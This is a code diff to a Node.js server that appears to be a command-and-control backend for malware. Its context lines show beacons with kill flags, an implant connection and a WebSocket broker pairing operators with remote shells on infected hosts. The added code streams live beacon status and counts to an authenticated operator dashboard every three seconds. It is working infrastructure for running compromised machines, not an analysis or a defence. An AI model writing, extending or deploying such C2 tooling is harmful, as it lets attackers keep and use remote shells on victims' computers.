@@ -50,6 +50,26 @@ function verifySessionToken(token) {
   }
 }
 
+// Live dashboard clients
+const dashboardClients = new Set();
+
+function buildBeaconPayload() {
+  const now = Math.floor(Date.now() / 1000);
+  const beacons = db.prepare('SELECT * FROM beacons ORDER BY last_seen DESC').all();
+  const pkgCount = db.prepare('SELECT COUNT(*) as c FROM packages').get().c;
+  const alive = beacons.filter(b => b.kill === 0 && b.last_seen > now - 120).length;
+  return JSON.stringify({ type: 'beacons', beacons, stats: { total: beacons.length, alive, packages: pkgCount }, now });
+}
+
+setInterval(() => {
+  if (!dashboardClients.size) return;
+  const msg = buildBeaconPayload();
+  for (const ws of dashboardClients) {
+    if (ws.readyState === 1) ws.send(msg);
+    else dashboardClients.delete(ws);
+  }
+}, 3000);
+
 // In-memory shell broker: beaconUUID → { operator?: WebSocket, implant?: WebSocket, lastSeen?: number }
 const shells = new Map();
 
@@ -131,6 +151,21 @@ const wss = new WebSocketServer({ noServer: true });
 
 server.on('upgrade', (req, socket, head) => {
   const pathname = parse(req.url).pathname;
+
+  // Dashboard live feed — session-authenticated
+  if (pathname === '/ws/dashboard') {
+    const cookies = parseCookies(req.headers.cookie);
+    const token = cookies[SESSION_COOKIE];
+    if (!token || !verifySessionToken(token)) return socket.destroy();
+    wss.handleUpgrade(req, socket, head, (ws) => {
+      dashboardClients.add(ws);
+      // Send initial state immediately
+      ws.send(buildBeaconPayload());
+      ws.on('close', () => dashboardClients.delete(ws));
+      ws.on('error', () => dashboardClients.delete(ws));
+    });
+    return;
+  }
 
   const mOpen    = pathname.match(/^\/ws\/shell\/(.+)\/open$/);
   const mConnect = pathname.match(/^\/ws\/shell\/(.+)\/connect$/);
